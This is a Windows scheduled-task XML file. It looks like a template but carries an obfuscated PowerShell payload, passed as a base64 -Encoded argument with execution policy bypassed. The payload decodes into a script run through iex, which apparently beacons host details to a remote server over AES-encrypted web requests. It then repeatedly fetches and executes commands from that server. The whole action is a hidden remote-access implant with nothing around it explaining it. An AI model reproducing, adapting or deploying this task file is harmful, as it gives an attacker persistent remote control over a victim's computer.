# task.xml
<?xml version="1.0" encoding="UTF-8"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>YYYY-MM-DDTHH:MM:SS</Date>
    <Author>AuthorName</Author>
    <Description>Description of the task</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>YYYY-MM-DDTHH:MM:SS</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT1H</Interval>
        <Count>1</Count>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>Domain\Username</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBGAE4ARgBVAGwAWgBGAFUAbAA5AFYAVQBrAHcAZwBQAFMAQQBpAGEASABSADAAYwBIAE0ANgBMAHkAOQBwAGIAbQBSAHAAWQBXADUAdABhAFcAdwB1AGEAVwA0AGkARABRAG8AawBWAFUARgBIAFAAUwBkAE4AYgAzAHAAcABiAEcAeABoAEwAegBVAHUATQBDAEEAbwBWADIAbAB1AFoARwA5ADMAYwB5AEIATwBWAEQAcwBnAFYAMgBsAHUAWgBHADkAMwBjAHkAQgBPAFYAQwBBAHgATQBDADQAdwBPAHkAQgBsAGIAaQAxAFYAVQB5AGsAZwBRAFgAQgB3AGIARwBWAFgAWgBXAEoATABhAFgAUQB2AE4AVABNADAATABqAFkAZwBLAEUAdABJAFYARQAxAE0ATABDAEIAcwBhAFcAdABsAEkARQBkAGwAWQAyAHQAdgBLAFMAQgBEAGEASABKAHYAYgBXAFUAdgBOAHkANAB3AEwAagBVAHcATQBDADQAdwBJAEYATgBoAFoAbQBGAHkAYQBTADgAMQBNAHoAUQB1AE4AaQBjAE4AQwBsAHQATwBaAFgAUQB1AFUAMgBWAHkAZABtAGwAagBaAFYAQgB2AGEAVwA1ADAAVABXAEYAdQBZAFcAZABsAGMAbAAwADYATwBsAE4AbABZADMAVgB5AGEAWABSADUAVQBIAEoAdgBkAEcAOQBqAGIAMgB3AGcAUABTAEIAYgBUAG0AVgAwAEwAbABOAGwAWQAzAFYAeQBhAFgAUgA1AFUASABKAHYAZABHADkAagBiADIAeABVAGUAWABCAGwAWABUAG8ANgBWAEcAeAB6AEwAQwBCAGIAVABtAFYAMABMAGwATgBsAFkAMwBWAHkAYQBYAFIANQBVAEgASgB2AGQARwA5AGoAYgAyAHgAVQBlAFgAQgBsAFgAVABvADYAVgBHAHgAegBNAFQARQBzAEkARgB0AE8AWgBYAFEAdQBVADIAVgBqAGQAWABKAHAAZABIAGwAUQBjAG0AOQAwAGIAMgBOAHYAYgBGAFIANQBjAEcAVgBkAE8AagBwAFUAYgBIAE0AeABNAGkAdwBnAFcAMAA1AGwAZABDADUAVABaAFcATgAxAGMAbQBsADAAZQBWAEIAeQBiADMAUgB2AFkAMgA5AHMAVgBIAGwAdwBaAFYAMAA2AE8AbABOAHoAYgBEAE0ATgBDAGwAdABPAFoAWABRAHUAVQAyAFYAeQBkAG0AbABqAFoAVgBCAHYAYQBXADUAMABUAFcARgB1AFkAVwBkAGwAYwBsADAANgBPAGwATgBsAFkAMwBWAHkAYQBYAFIANQBVAEgASgB2AGQARwA5AGoAYgAyAHcAZwBQAFMAQQBpAFYARwB4AHoATABDAEIAVQBiAEgATQB4AE0AUwB3AGcAVgBHAHgAegBNAFQASQBzAEkARgBOAHoAYgBEAE0AaQBEAFEAbwBqAEkASABOADAAWQBYAEoAMABJAEcAbAB1AGQARwBWAHkAYgBtAEYAcwBJAEcAWgAxAGIAbQBOADAAYQBXADkAdQBEAFEAcABtAGQAVwA1AGoAZABHAGwAdgBiAGkAQgBUAGUAWABOADAAWgBXADEASgBiAG0AWgB2AEkASABzAE4AQwBpAEEAZwBJAEMAQQBrAFMAVgBBAGcAUABTAEIASgBiAG4AWgB2AGEAMgBVAHQAVQBtAFYAegBkAEUAMQBsAGQARwBoAHYAWgBDAEIAbwBkAEgAUgB3AGMAegBvAHYATAAyAGwAawBaAFcANQAwAEwAbQAxAGwASQBDADEAVgBjADIAVgB5AFEAVwBkAGwAYgBuAFEAZwBKAEYAVgBCAFIAdwAwAEsASQBDAEEAZwBJAEMAUgBWAFMAVQBRAGcAUABTAEEAbwBSADIAVgAwAEwAVQBOAHAAYgBVAGwAdQBjADMAUgBoAGIAbQBOAGwASQBDADEARABiAEcARgB6AGMAeQBCAFgAYQBXADQAegBNAGwAOQBEAGIAMgAxAHcAZABYAFIAbABjAGwATgA1AGMAMwBSAGwAYgBWAEIAeQBiADIAUgAxAFkAMwBRAHAATABsAFYAVgBTAFUAUQBOAEMAaQBBAGcASQBDAEEAawBTAFUANQBHAFQAeQBBADkASQBFAGQAbABkAEMAMQBEAGIAMgAxAHcAZABYAFIAbABjAGsAbAB1AFoAbQA4AE4AQwBpAEEAZwBJAEEAMABLAEkAQwBBAGcASQBDAE0AZwBTAGwATgBQAFQAaQBCAFQAVwBWAE4AVQBSAFUAMABnAFMAVQA1AEcAVAB3ADAASwBEAFEAbwBnAEkAQwBBAGcASgBGAE4AWgBVADEAUgBGAFQAUwBBADkASQBFAEIANwBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEgAVgAxAGEAVwBRAGcASQBDAEEAZwBJAEMAQQA5AEkAQwBJAGsAVgBVAGwARQBJAGcAMABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQgB3AGQAVwBKAHMAYQBXAE4AZgBhAFgAQQBnAFAAUwBBAGkASgBFAGwAUQBJAGcAMABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQgBwAGIAbQBaAHYASQBDAEEAZwBJAEMAQQBnAFAAUwBBAGsAUwBVADUARwBUAHcAMABLAEkAQwBBAGcASQBIADAATgBDAGkAQQBOAEMAaQBBAGcASQBDAEIAeQBaAFgAUgAxAGMAbQA0AGcASgBGAE4AWgBVADEAUgBGAFQAUwBBAE4AQwBuADAATgBDAGcAMABLAFoAbgBWAHUAWQAzAFIAcABiADIANABnAFIAVwA1AGoAYwBuAGwAdwBkAEYATgAwAGMAbQBsAHUAWgB5AEIANwBEAFEAbwBnAEkAQwBBAGcAVQBHAEYAeQBZAFcAMABnAEsARgB0AHoAZABIAEoAcABiAG0AZABkAEoARwBsAHUAYwBIAFYAMABVADMAUgB5AEsAUQAwAEsARABRAG8AZwBJAEMAQQBnAEoARwBsAHUAYwBIAFYAMABRAG4AbAAwAFoAWABNAGcAUABTAEIAYgBVADMAbAB6AGQARwBWAHQATABsAFIAbABlAEgAUQB1AFIAVwA1AGoAYgAyAFIAcABiAG0AZABkAE8AagBwAFYAVgBFAFkANABMAGsAZABsAGQARQBKADUAZABHAFYAegBLAEMAUgBwAGIAbgBCADEAZABGAE4AMABjAGkAawBOAEMAaQBBAGcASQBDAEEAawBaAFcANQBqAEkARAAwAGcAVwAxAE4ANQBjADMAUgBsAGIAUwA1AFUAWgBYAGgAMABMAGsAVgB1AFkAMgA5AGsAYQBXADUAbgBYAFQAbwA2AFYAVgBSAEcATwBBADAASwBEAFEAbwBnAEkAQwBBAGcASgBFAEYARgBVAHkAQQA5AEkARQA1AGwAZAB5ADEAUABZAG0AcABsAFkAMwBRAGcAVQAzAGwAegBkAEcAVgB0AEwAbABOAGwAWQAzAFYAeQBhAFgAUgA1AEwAawBOAHkAZQBYAEIAMABiADIAZAB5AFkAWABCAG8AZQBTADUAQgBSAFYATgBOAFkAVwA1AGgAWgAyAFYAawBEAFEAbwBnAEkAQwBBAGcASgBHAGwAMgBJAEQAMABnAEkAaQBZADUASwBuAHAAVABOADAAeABaAEoAVgBwAE8ATQBYAFIAbwBaAGsAawBpAEQAUQBvAGcASQBDAEEAZwBKAEUARgBGAFUAeQA1AE4AYgAyAFIAbABJAEQAMABnAFcAMQBOADUAYwAzAFIAbABiAFMANQBUAFoAVwBOADEAYwBtAGwAMABlAFMANQBEAGMAbgBsAHcAZABHADkAbgBjAG0ARgB3AGEASABrAHUAUQAyAGwAdwBhAEcAVgB5AFQAVwA5AGsAWgBWADAANgBPAGsATgBDAFEAdwAwAEsASQBDAEEAZwBJAEMAUgBCAFIAVgBNAHUAUQBtAHgAdgBZADIAdABUAGEAWABwAGwASQBEADAAZwBNAFQASQA0AEQAUQBvAGcASQBDAEEAZwBKAEUARgBGAFUAeQA1AEwAWgBYAGwAVABhAFgAcABsAEkARAAwAGcATQBqAFUAMgBEAFEAbwBnAEkAQwBBAGcASgBFAEYARgBVAHkANQBKAFYAaQBBADkASQBDAFIAbABiAG0ATQB1AFIAMgBWADAAUQBuAGwAMABaAFgATQBvAEoARwBsADIASwBRADAASwBJAEMAQQBnAEkAQwBSAEIAUgBWAE0AdQBTADIAVgA1AEkARAAwAGcASgBHAFYAdQBZAHkANQBIAFoAWABSAEMAZQBYAFIAbABjAHkAZwBpAE0AVABJAHoATgBEAFUAMgBOAHoAZwA1AE0ARABFAHkATQB6AFEAMQBOAGoAYwA0AE8AVABBAHgATQBqAE0AMABjAGoAQgBvAGIAMgB4AHMAWQBXAGcAaQBLAFEAMABLAEQAUQBvAGcASQBDAEEAZwBKAEcAVgB1AFkAMwBKADUAYwBIAFIAdgBjAGkAQQA5AEkAQwBSAEIAUgBWAE0AdQBRADMASgBsAFkAWABSAGwAUgBXADUAagBjAG4AbAB3AGQARwA5AHkASwBDAGsATgBDAGcAMABLAEkAQwBBAGcASQBDAFIAbABiAG0ATgB5AGUAWABCADAAWgBXAFIAQwBlAFgAUgBsAGMAeQBBADkASQBDAFIAbABiAG0ATgB5AGUAWABCADAAYgAzAEkAdQBWAEgASgBoAGIAbgBOAG0AYgAzAEoAdABSAG0AbAB1AFkAVwB4AEMAYgBHADkAagBhAHkAZwBrAGEAVwA1AHcAZABYAFIAQwBlAFgAUgBsAGMAeQB3AGcATQBDAHcAZwBKAEcAbAB1AGMASABWADAAUQBuAGwAMABaAFgATQB1AGIARwBWAHUAWgAzAFIAbwBLAFEAMABLAEkAQwBBAGcASQBDAFIAdgBkAFgAUgB3AGQAWABRAGcAUABTAEIAYgBRADIAOQB1AGQAbQBWAHkAZABGADAANgBPAGwAUgB2AFEAbQBGAHoAWgBUAFkAMABVADMAUgB5AGEAVwA1AG4ASwBDAFIAbABiAG0ATgB5AGUAWABCADAAWgBXAFIAQwBlAFgAUgBsAGMAeQBrAE4AQwBnADAASwBJAEMAQQBnAEkASABKAGwAZABIAFYAeQBiAGkAQQBrAGIAMwBWADAAYwBIAFYAMABEAFEAcAA5AEQAUQBwAG0AZABXADUAagBkAEcAbAB2AGIAaQBCAEUAWQAzAEoANQBjAEgAUgBUAGQASABKAHAAYgBtAGMAZwBlAHcAMABLAEkAQwBBAGcASQBGAEIAaABjAG0ARgB0AEkAQwBoAGIAYwAzAFIAeQBhAFcANQBuAFgAUwBSAHAAYgBuAEIAMQBkAEYATgAwAGMAaQBrAE4AQwBpAEEAZwBJAEMAQQBrAFoARwBGADAAWQBTAEEAOQBJAEYAdABEAGIAMgA1ADIAWgBYAEoAMABYAFQAbwA2AFIAbgBKAHYAYgBVAEoAaABjADIAVQAyAE4ARgBOADAAYwBtAGwAdQBaAHkAZwBrAGEAVwA1AHcAZABYAFIAVABkAEgASQBwAEQAUQBvAGcASQBDAEEAZwBKAEcAbAAyAEkARAAwAGcASQBpAFkANQBLAG4AcABUAE4AMAB4AFoASgBWAHAATwBNAFgAUgBvAFoAawBrAGkARABRAG8AZwBJAEMAQQBnAEoARwB0AGwAZQBTAEEAOQBJAEMASQB4AE0AagBNADAATgBUAFkAMwBPAEQAawB3AE0AVABJAHoATgBEAFUAMgBOAHoAZwA1AE0ARABFAHkATQB6AFIAeQBNAEcAaAB2AGIARwB4AGgAYQBDAEkAdQBVAEcARgBrAFUAbQBsAG4AYQBIAFEAbwBNAFQAWQBzAEkARgB0AGoAYQBHAEYAeQBYAFQAQQBwAEQAUQBvAGcASQBDAEEAZwBKAEcARgBsAGMAeQBBADkASQBGAHQAVABlAFgATgAwAFoAVwAwAHUAVQAyAFYAagBkAFgASgBwAGQASABrAHUAUQAzAEoANQBjAEgAUgB2AFoAMwBKAGgAYwBHAGgANQBMAGsARgBsAGMAMQAwADYATwBrAE4AeQBaAFcARgAwAFoAUwBnAHAARABRAG8AZwBJAEMAQQBnAEoASABWADAAWgBqAGcAZwBQAFMAQgBiAFUAMwBsAHoAZABHAFYAdABMAGwAUgBsAGUASABRAHUAUgBXADUAagBiADIAUgBwAGIAbQBkAGQATwBqAHAAVgBkAEcAWQA0AEQAUQBvAGcASQBDAEEAZwBKAEcARgBsAGMAeQA1AEwAWgBYAGsAZwBQAFMAQQBrAGQAWABSAG0ATwBDADUASABaAFgAUgBDAGUAWABSAGwAYwB5AGcAawBhADIAVgA1AEsAUQAwAEsASQBDAEEAZwBJAEMAUgBoAFoAWABNAHUAUwBWAFkAZwBQAFMAQQBrAGQAWABSAG0ATwBDADUASABaAFgAUgBDAGUAWABSAGwAYwB5AGcAawBhAFgAWQBwAEQAUQBvAGcASQBDAEEAZwBKAEcAUgBsAFkAeQBBADkASQBDAFIAaABaAFgATQB1AFEAMwBKAGwAWQBYAFIAbABSAEcAVgBqAGMAbgBsAHcAZABHADkAeQBLAEMAawBOAEMAaQBBAGcASQBDAEEAawBVAGsAVgBUAFYAVQB4AFUASQBEADAAZwBKAEcAUgBsAFkAeQA1AFUAYwBtAEYAdQBjADIAWgB2AGMAbQAxAEcAYQBXADUAaABiAEUASgBzAGIAMgBOAHIASwBDAFIAawBZAFgAUgBoAEwAQwBBAHcATABDAEEAawBaAEcARgAwAFkAUwA1AE0AWgBXADUAbgBkAEcAZwBwAEQAUQBvAGcASQBDAEEAZwBKAEYASgBGAFUAMQBWAE0AVgBGAE4AMABjAGkAQQA5AEkAQwBSADEAZABHAFkANABMAGsAZABsAGQARgBOADAAYwBtAGwAdQBaAHkAZwBrAFUAawBWAFQAVgBVAHgAVQBLAFEAMABLAEkAQwBBAGcASQBGAGQAeQBhAFgAUgBsAEwAVQA5ADEAZABIAEIAMQBkAEMAQQBrAFUAawBWAFQAVgBVAHgAVQBVADMAUgB5AEQAUQBvAGcASQBDAEEAZwBKAEcAUgBsAFkAeQA1AEUAYQBYAE4AdwBiADMATgBsAEsAQwBrAE4AQwBuADAATgBDAGcAMABLAFoAbgBWAHUAWQAzAFIAcABiADIANABnAFUAbgBWAHUAUQAyADkAdABiAFcARgB1AFoAQwBCADcARABRAG8AZwBJAEMAQQBnAFUARwBGAHkAWQBXADAAZwBLAEYAdAB6AGQASABKAHAAYgBtAGQAZABKAEcAbAB1AGMASABWADAAVQAzAFIAeQBLAFEAMABLAEkAQwBBAGcASQBHAGwAbQBJAEMAZwBrAGEAVwA1AHcAZABYAFIAVABkAEgASQBnAEwAVwB4AHAAYQAyAFUAZwBJAGwAUgBsAGMAbQAxAHAAYgBtAEYAMABaAFMASQBwAEkASABzAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcAWgBYAGgAcABkAEEAMABLAEkAQwBBAGcASQBIADAATgBDAGcAMABLAEkAQwBBAGcASQBIAEoAbABkAEgAVgB5AGIAaQBCAEoAYgBuAFoAdgBhADIAVQB0AFIAWABoAHcAYwBtAFYAegBjADIAbAB2AGIAaQBBAGsAYQBXADUAdwBkAFgAUgBUAGQASABJAGcAZgBDAEIAUABkAFgAUQB0AFUAMwBSAHkAYQBXADUAbgBEAFEAbwBOAEMAbgAwAE4AQwBpAE0AZwBaAFcANQBrAEkARwBsAHUAZABHAFYAeQBiAG0ARgBzAEkARwBaADEAYgBtAE4AMABhAFcAOQB1AEQAUQBvAE4AQwBuAGQAbwBhAFcAeABsAEkAQwBnAGsAZABIAEoAMQBaAFMAawBnAGUAdwAwAEsASQBDAEEAZwBJAEMAUgBUAFcAVgBOAFUAUgBVADAAZwBQAFMAQgBUAGUAWABOADAAWgBXADEASgBiAG0AWgB2AEkAQQAwAEsARABRAG8AZwBJAEMAQQBnAEoARQBwAFQAVAAwADQAZwBQAFMAQQBrAFUAMQBsAFQAVgBFAFYATgBJAEgAdwBnAFEAMgA5AHUAZABtAFYAeQBkAEYAUgB2AEwAVQBwAFQAVAAwADQAZwBMAFUAUgBsAGMASABSAG8ASQBEAEUAdwBNAEEAMABLAEkAQwBBAGcASQBDAFIARABVAGwAbABRAFYAQwBBADkASQBFAFYAdQBZADMASgA1AGMASABSAFQAZABIAEoAcABiAG0AYwBnAEkAQwBSAEsAVQAwADkATwBEAFEAbwBnAEQAUQBvAGcASQBDAEEAZwBKAEYAQgBCAFUAawBGAE4ASQBEADAAZwBRAEgAcwBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAFIARQBGAFUAUQBTAEEAZwBJAEMAQQBnAFAAUwBBAGsAUQAxAEoAWgBVAEYAUQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAGIAbQBWADMAWAAzAFYAegBaAFgASQBnAFAAUwBBAGkAYgAyAHMAaQBEAFEAbwBnAEkAQwBBAGcARABRAG8AZwBJAEMAQQBnAGYAUQAwAEsASQBBADAASwBJAEMAQQBnAEkARQBsAHUAZABtADkAcgBaAFMAMQBTAFoAWABOADAAVABXAFYAMABhAEcAOQBrAEkAQwBBAHQAVABXAFYAMABhAEcAOQBrAEkAQwBkAFEAYgAzAE4AMABKAHkAQQB0AFYAWABKAHAASQBDAFIAVABSAFYASgBXAFIAVgBKAGYAVgBWAEoATQBJAEMAQQB0AFEAbQA5AGsAZQBTAEEAZwBKAEYAQgBCAFUAawBGAE4ASQBDADEAVgBjADIAVgB5AFEAVwBkAGwAYgBuAFEAZwBKAEYAVgBCAFIAdwAwAEsASQBDAEEAZwBEAFEAbwBnAEkAQwBBAGcAZAAyAGgAcABiAEcAVQBnAEsAQwBSADAAYwBuAFYAbABLAFMAQgA3AEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBSAFUAUwBVADEARgBVAGkAQQA5AEkARQBkAGwAZABDADEAUwBZAFcANQBrAGIAMgAwAGcATABWAE4AbABkAEYATgBsAFoAVwBRAGcATQBUAEEAdwBJAEMAMQBOAFkAWABoAHAAYgBYAFYAdABJAEQARQB3AE0ARABBAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcAVQAzAFIAaABjAG4AUQB0AFUAMgB4AGwAWgBYAEEAZwBMAFUAMQBwAGIARwB4AHAAYwAyAFYAagBiADIANQBrAGMAeQBBAGsAVgBFAGwATgBSAFYASQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEoARgBWAEoAUgBDAEEAOQBJAEMAaABIAFoAWABRAHQAUQAyAGwAdABTAFcANQB6AGQARwBGAHUAWQAyAFUAZwBMAFUATgBzAFkAWABOAHoASQBGAGQAcABiAGoATQB5AFgAMABOAHYAYgBYAEIAMQBkAEcAVgB5AFUAMwBsAHoAZABHAFYAdABVAEgASgB2AFoASABWAGoAZABDAGsAdQBWAFYAVgBKAFIAQQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGsAVQAxAGwAVABWAEUAVgBOAEkARAAwAGcAUQBIAHMATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkASABWADEAYQBXAFEAZwBQAFMAQQBpAEoARgBWAEoAUgBDAEkATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBmAFEAMABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBrAFMAbABOAFAAVABpAEEAOQBJAEMAUgBUAFcAVgBOAFUAUgBVADAAZwBmAEMAQgBEAGIAMgA1ADIAWgBYAEoAMABWAEcAOAB0AFMAbABOAFAAVABpAEEAdABSAEcAVgB3AGQARwBnAGcATQBUAEEAdwBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAUgBEAFUAbABsAFEAVgBDAEEAOQBJAEUAVgB1AFkAMwBKADUAYwBIAFIAVABkAEgASgBwAGIAbQBjAGcASQBDAFIASwBVADAAOQBPAEQAUQBvAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcASgBGAEIAQgBVAGsARgBOAEkARAAwAGcAUQBIAHMATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkARQBSAEIAVgBFAEUAZwBQAFMAQQBrAFEAMQBKAFoAVQBGAFEATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCADkARABRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBKAEYASgBGAFUAMQBWAE0AVgBDAEEAOQBJAEUAbAB1AGQAbQA5AHIAWgBTADEAUwBaAFgATgAwAFQAVwBWADAAYQBHADkAawBJAEMAQQB0AFQAVwBWADAAYQBHADkAawBJAEMAZABRAGIAMwBOADAASgB5AEEAdABWAFgASgBwAEkAQwBSAFQAUgBWAEoAVwBSAFYASgBmAFYAVgBKAE0ASQBDAEEAdABRAG0AOQBrAGUAUwBBAGcASgBGAEIAQgBVAGsARgBOAEkAQwBBAHQAVgBYAE4AbABjAGsARgBuAFoAVwA1ADAASQBDAFIAVgBRAFUAYwBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEoARgBKAEYAVQBTAEEAOQBJAEUAUgBqAGMAbgBsAHcAZABGAE4AMABjAG0AbAB1AFoAeQBnAGsAVQBrAFYAVABWAFUAeABVAEsAUQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCAHAAWgBpAEEAbwBKAEYASgBGAFUAUwBBAHQAYgBtAFUAZwBJAG4AZABoAGEAWABRAGkASwBTAEIANwBEAFEAbwBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAFIASwBVADAAOQBPAEkARAAwAGcASgBGAEoARgBVAFMAQgA4AEkARQBOAHYAYgBuAFoAbABjAG4AUgBHAGMAbQA5AHQATABVAHAAegBiADIANABOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAFIATgBUADAAUgBGAEkARAAwAGcASgBFAHAAVABUADAANAB1AGEAbgBOAHYAYgBnADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBSAEQAVABVAFEAZwBQAFMAQQBrAFMAbABOAFAAVABpADUAagBiAFcAUQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAFIAUwBWAFUANABnAFAAUwBCAFMAZABXADUARABiADIAMQB0AFkAVwA1AGsASQBDAFIARABUAFUAUQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBHAGwAbQBJAEMAZwBrAFUAbABWAE8ASQBDADEAbABjAFMAQQBpAEkAaQBrAGcAZQB3ADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAFIAUwBWAFUANABnAFAAUwBBAGkAVAAwAHMAaQBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBCADkARABRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBKAEUATgBOAFIARgA5AFYAUwBVAFEAZwBQAFMAQQBrAFMAbABOAFAAVABpADUAagBiAFcAUgBmAGQAVwBsAGsARABRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBrAFUAMQBsAFQAVgBFAFYATgBJAEQAMABnAFEASABzAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBCADEAZABXAGwAawBJAEMAQQBnAEkARAAwAGcASQBpAFIAVgBTAFUAUQBpAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAGMAbQBWAHoAZABXAHgAMABJAEMAQQA5AEkAQwBJAGsAVQBsAFYATwBJAGcAMABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEcATgB0AFoARgA5ADEAYQBXAFEAZwBQAFMAQQBpAEoARQBOAE4AUgBGADkAVgBTAFUAUQBpAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEIAOQBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGsAUwBsAE4AUABUAGkAQQA5AEkAQwBSAFQAVwBWAE4AVQBSAFUAMABnAGYAQwBCAEQAYgAyADUAMgBaAFgASgAwAFYARwA4AHQAUwBsAE4AUABUAGkAQQB0AFIARwBWAHcAZABHAGcAZwBNAFQAQQB3AEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAUgBEAFUAbABsAFEAVgBDAEEAOQBJAEUAVgB1AFkAMwBKADUAYwBIAFIAVABkAEgASgBwAGIAbQBjAGcASQBDAFIASwBVADAAOQBPAEQAUQBvAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAUgBRAFEAVgBKAEIAVABTAEEAOQBJAEUAQgA3AEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAFIARQBGAFUAUQBTAEEAOQBJAEMAUgBEAFUAbABsAFEAVgBBADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEIAOQBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBFAGwAdQBkAG0AOQByAFoAUwAxAFMAWgBYAE4AMABUAFcAVgAwAGEARwA5AGsASQBDAEEAdABUAFcAVgAwAGEARwA5AGsASQBDAGQAUQBiADMATgAwAEoAeQBBAHQAVgBYAEoAcABJAEMAUgBUAFIAVgBKAFcAUgBWAEoAZgBWAFYASgBNAEkAQwBBAHQAUQBtADkAawBlAFMAQQBnAEoARgBCAEIAVQBrAEYATgBJAEMAMQBWAGMAMgBWAHkAUQBXAGQAbABiAG4AUQBnAEoARgBWAEIAUgB3ADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBmAFEAMABLAEkAQwBBAGcASQBIADAATgBDAGkAQQBnAEkAQwBBAE4AQwBpAEEAZwBJAEMAQQBOAEMAbgAwAGcARABRAG8APQAiAH0AJwAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBKAHMAbwBuACkALgBTAGMAcgBpAHAAdAApACkAIAB8ACAAaQBlAHgA"</Arguments>
    </Exec>
  </Actions>
</Task>
